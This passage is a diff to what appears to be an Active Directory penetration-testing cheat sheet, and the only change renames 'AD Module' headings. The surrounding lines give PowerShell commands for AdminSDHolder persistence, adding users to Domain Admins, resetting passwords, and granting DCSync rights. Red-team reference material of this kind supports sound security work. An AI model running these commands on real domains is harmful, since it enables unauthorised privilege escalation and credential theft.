@@ -287,7 +287,7 @@ Fist we need to add full controll permissions fo a user to the AdminSDHolder:
 ```powershell
 Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName user1 -Rights All -Verbose
 ```
-* AD Module:
+* ADModule:
 ```powershell
 Set-ADACL -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=corp,DC=local' -Principal user1 -Verbose 
 ```
@@ -316,7 +316,7 @@ To check the Domain Admin Permissions as normal user:
 Get-ObjectACL -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'user1'}
 ```
 
-* AD Module:
+* ADModule:
 ```powershell
 (Get-Acl -Path 'AD:\CN=Domain Admins,CN=Users,DC=corp,DC=local').Access | ?{$_.IdentityReference -match 'user1'}
 ```
@@ -332,7 +332,7 @@ Finally we just need to abuse it.
 Add-DomainGroupMember -Identity 'Domain Admins' -Members user2 -Verbose
 ```
 
-* AD Module:
+* ADModule:
 ```powershell
 Add-ADGroupMember -Identity 'Domain Admins' -Members user2 -Verbose
 ```
@@ -343,7 +343,7 @@ Add-ADGroupMember -Identity 'Domain Admins' -Members user2 -Verbose
 ```powershell
 Set-DomainUserPassword -Identity user2 -AccountPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force) -Verbose
 ```
-* AD Module:
+* ADModule:
 ```powershell
 Set-ADACcountPassword -Identity user2 -NewPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force) -Verbose
 ```
@@ -361,7 +361,7 @@ First, add full control rights:
 Add-ObjectAcl -TargetDistinguishedName 'DC=corp,DC=local' -PrincipalSamAccountName user1 -Rights All -Verbose
 ```
 
-* AD Module:
+* ADModule:
 ```powershell
 Set-ADACL -DistinguishedName 'DC=corp,DC=local' -Principal user1 -Verbose
 ```
@@ -375,7 +375,7 @@ There are even more intereting ACLs which can be abused. With DA privileges, the
 Add-ObjectAcl -TargetDistinguishedName 'DC=corp,DC=local' -PrincipalSamAccountName user1 -Rights DCSync -Verbose
 ```
 
-* AD Module:
+* ADModule:
 ```powershell
 Set-ADACL -DistinguishedName 'DC=corp,DC=local' -Principal user1 -GUIDRight DCSync -Verbose
 ```
